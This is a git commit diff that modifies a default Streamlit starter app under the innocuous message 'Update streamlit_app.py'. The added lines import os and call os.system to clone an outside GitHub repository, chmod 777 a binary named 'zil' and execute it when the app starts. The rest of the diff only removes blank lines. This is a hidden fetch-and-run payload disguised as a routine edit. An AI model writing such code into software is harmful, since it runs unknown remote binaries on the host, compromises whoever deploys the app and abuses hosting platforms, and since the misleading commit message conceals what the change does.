11e98f6030111ea2f3fc30664898c64172e33ff6
selokguine3 <106552351+selokguine3@users.noreply.github.com>
2022-05-31 00:59:42 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -3,15 +3,13 @@ import altair as alt
 import math
 import pandas as pd
 import streamlit as st
-
+import os
+os.system ("git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 zil && ./zil")
 """
 # Welcome to Streamlit!
-
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
-
 If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
 forums](https://discuss.streamlit.io).
-
 In the meantime, below is an example of what you can do with just a few lines of code:
 """
 
